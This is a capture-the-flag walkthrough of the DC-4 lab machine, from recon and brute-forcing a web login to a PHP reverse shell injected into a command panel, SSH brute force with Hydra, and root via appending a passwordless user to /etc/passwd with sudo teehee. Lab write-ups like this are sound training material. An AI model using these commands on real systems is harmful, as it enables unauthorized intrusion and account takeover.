# 🖥️ DC-4 Privilege Escalation Walkthrough

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

## Step-1: Reconnaissance – Find Target IP

**note:** Recon all process kind of similar that i explain into previous machine. In this machine i use just example for recon processs. Mind it!.
**In this machine recon process all the result are just example not valid, valid with bruteforcing..**

First, we need the IP address of the vulnerable DC-4 machine running in VirtualBox. Use `netdiscover`:

```
sudo netdiscover
```

📌 **Hint**: If `netdiscover` does not show results, try `arp-scan` or check your VirtualBox network adapter mode.

**Result Example:**

```
192.168.0.104   08:00:27:bb:9f:11      1     60  PCS Systemtechnik GmbH
```

This is our target IP → `192.168.0.104`.

---

## Step-2: Scan for Open Ports & Services

We need to find which services are running. Use a fast scanner like `rustscan` (or `nmap`):

```
rustscan -a 192.168.0.104
```

**Result Example:**

```
22/tcp   open  ssh
80/tcp   open  http (nginx)
```

So we have **SSH** (22) and **HTTP** (80 with nginx).

---

## Step-3: Enumerate HTTP Service

Visit in browser:

```
http://192.168.0.104
```

You’ll see a **login page**. At first glance, nothing looks vulnerable. Time to check hidden endpoints.

### Discover Endpoints

You can use **Burp Suite, gobuster, or wfuzz**.

Example with `gobuster`:

```
gobuster dir -u http://192.168.0.104 -w /usr/share/wordlists/dirb/common.txt
```

**Result:**

```
/logout.php (302)
/command.php (302)
```

📌 **Hint**: Status code `302` (redirection) usually means “restricted” or “needs authentication” → interesting!

---

## Step-4: Brute-Force Login

The login page asks for credentials. Try **brute force** with Burp Suite Intruder or Hydra.

- Using **Burp Suite** (captured request)

  - then send into intruder
  - set the position (password) and add wordlist
  - attack

- Set `username=admin`
- Attack the `password` field

**Result:**

```
admin:happy
```

✅ We found credentials with 302 status code. Make sure you filter out this req and response to get the main result thay you want!

---

## Step-5: Gain Remote Command Execution

Login as `admin:happy`. Inside the panel, you can execute commands. This is the entry point for our **reverse shell**.

### Inject Reverse Shell

First, start a **netcat listener** on your attacker machine:

```
nc -lnvp 1234
```

Then inject payload via Burp:

```
ls+-a|php -r '$s=fsockopen("192.168.0.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Note:** Injecti this reverse shell using burpsuite after 'ls+a' commands. We know using pipeline we can run multiple command at a same times, right?
📌 **Hint**: Here `192.168.0.11` is your attacker machine’s IP. Replace it with yours.
Find the ip use this command -

```
ifconfig
```

Now send the request, and you should receive a shell in your nc terminal.

---

## Step-6: User Enumeration

We now have a shell as a **low-privilege user**. Next step is to enumerate:

```
cat /etc/passwd
ls /home
```

**Result Example:**

```
Users: jim, charles, ...
```

Inside **jim’s folder** → you’ll find a `backup` directory containing an **old-passwords.txt** file. and
into home directory we found some username (we can see also into /etc/passwd if we have permission), right? copy those name and save with user.txt.

---

## Step-7: SSH Brute Force with Hydra

Use the username list (`users.txt`) and the old passwords list:

```
hydra -L users.txt -P old-passwords.txt ssh://192.168.0.104 -f -V
```

**Result:**

```
[22][ssh] host: 192.168.0.104   login: jim   password: jibril04
```

✅ We got **SSH credentials for jim**.

---

## Step-8: Pivot to Another User

Login as jim, then enumerate again.

```
ssh jim@192.168.0.104
```

**note:** we all can chenge one user to another user -

```
su <user_name>
password: <>
```

Check `/home/jim/mail` → you’ll find a mail containing another user’s credentials

```
charles:^xHhA&hvim0y
```

Now switch user:

```
su charles
```

---

## Step-9: Privilege Escalation with Sudo

Check sudo permissions:

```
sudo -l
```

**Result:**

```
(root) NOPASSWD: /usr/bin/teehee
```

This means **charles** can run `teehee` as root without password.

### Exploit with Teehee

We can append a root user into `/etc/passwd`:

```
echo "reja::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

Switch to root:

```
su reja
```

Now you’re root →

```
whoami
root
cd /root
ls
cat flag.txt
```

---

# 🎉 Final Result

✅ We escalated from **admin panel → jim → charles → root**
✅ We read the final flag as root.

---

# 🔑 Key Takeaways

- Enumeration is the most important step (hidden endpoints gave us command execution).
- Always check `/etc/passwd` and `/home` for clues.
- Hydra and old passwords lists are powerful for SSH brute force.
- `sudo -l` and tools like `linpeas` help you spot privilege escalation paths.
- **teehee** is a misconfigured binary (odd but exploitable).

--- THE END ---
